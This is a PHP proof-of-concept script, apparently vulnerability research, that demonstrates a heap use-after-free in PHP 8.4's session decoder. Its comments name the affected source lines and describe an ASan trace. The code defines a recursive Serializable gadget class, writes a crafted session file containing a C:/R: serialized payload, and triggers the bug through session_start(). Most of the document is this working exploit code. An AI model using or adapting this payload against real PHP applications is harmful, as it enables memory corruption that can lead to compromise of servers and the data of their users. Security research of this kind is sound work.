#!/usr/bin/env php
<?php
/*
 * NEW FINDING: session decode path also hits the Serializable var_hash UAF.
 *
 * PS_SERIALIZER_DECODE_FUNC(php) (ext/session/session.c:1103) runs
 * PHP_VAR_UNSERIALIZE_INIT with NO BG(serialize_lock) — a C: Serializable
 * entry inside the session data runs its unserialize() with the inner
 * parse SHARING the session decoder's var_hash. Post-parse property
 * growth inside the gadget frees the registered slots; subsequent R:n;
 * in the same session stream read freed memory — during session_start().
 *
 * Attack surface shift vs. the classic unserialize() entry: any path that
 * lets attacker-serialized data land in a session store (custom save
 * handler, Redis/DB-backed sessions, another bug planting a session file)
 * + an app with a recursive Serializable gadget class loaded before
 * session_start() => UAF at session_start(), no unserialize() entry needed.
 *
 * Verified: php-src 8.4.4 ASan build (USE_ZEND_ALLOC=0) — see
 * session_decode_uaf_evidence.txt: zif_session_start -> php_session_decode
 * -> ps_srlzr_decode_php -> R: handler -> heap-use-after-free READ.
 *
 * Note (related surface, closed): session.upload_progress key injection is
 * DEAD on current PHP — PS_SERIALIZER_ENCODE_FUNC(php) refuses to encode
 * any key containing '|' (session.c:1072), so attacker bytes can no longer
 * reach the session file via the upload-progress key.
 */
error_reporting(0);

class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        $o = unserialize($data);
        $o->x = 0;   // 9th prop -> 8->16 resize -> frees slots 4..11 of the SHARED var_hash
    }
}

$dir = sys_get_temp_dir() . '/sess_uaf_poc';
@mkdir($dir);
$sid = 'SessionUafPoc000000000000000000';

// 1. plant the session file (stands in for any attacker write-into-session-store vector)
$inner = 'O:8:"stdClass":8:{';
for ($i = 0; $i < 8; $i++) { $inner .= 's:1:"' . chr(97 + $i) . '";i:' . ($i + 100) . ';'; }
$inner .= '}';
$val = 'a:3:{i:0;C:10:"CachedData":' . strlen($inner) . ':{' . $inner . '}i:1;R:4;i:2;R:5;}';
file_put_contents("$dir/sess_$sid", "upload_progress_x|$val");

// 2. trigger: session_start decodes it -> gadget runs unlocked -> R:4/R:5 dangle
session_save_path($dir);
ini_set('session.serialize_handler', 'php');
session_id($sid);
session_start();
var_export($_SESSION);
echo "\nsurvived (non-ASan allocator hides the UAF; run under ASan + USE_ZEND_ALLOC=0 to fire)\n";
